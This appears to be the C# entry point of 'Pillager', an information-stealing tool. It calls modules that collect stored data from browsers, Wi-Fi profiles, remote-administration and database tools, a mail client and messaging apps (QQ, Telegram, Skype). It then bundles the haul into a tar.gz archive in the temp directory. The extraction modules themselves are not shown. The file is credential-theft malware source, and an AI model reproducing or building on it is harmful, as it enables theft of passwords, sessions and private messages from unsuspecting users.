using System.IO;
using Pillager.Browsers;
using Pillager.Helper;
using Pillager.Mails;
using Pillager.Messengers;
using Pillager.Others;
using Pillager.Tools;

namespace Pillager
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
            string savezippath = savepath + ".tar.gz";
            if (Directory.Exists(savepath)) Directory.Delete(savepath, true);
            if (File.Exists(savezippath)) File.Delete(savezippath);
            Directory.CreateDirectory(savepath);

            //Browsers
            IE.Save(savepath);
            OldSogou.Save(savepath);//SogouExplorer < 12.x
            Chrome.Save(savepath);
            FireFox.Save(savepath);

            //Others
            Wifi.Save(savepath);

            //Tools
            MobaXterm.Save(savepath);
            Xmanager.Save(savepath);
            Navicat.Save(savepath);
            RDCMan.Save(savepath);

            //Mail
            MailMaster.Save(savepath);

            //Messengers
            QQ.Save(savepath);
            Telegram.Save(savepath);
            Skype.Save(savepath);
            Enigma.Save(savepath);

            //Tar.gz
            Tar.Pack(savepath, savezippath);
            Directory.Delete(savepath, true);
        }
    }
}
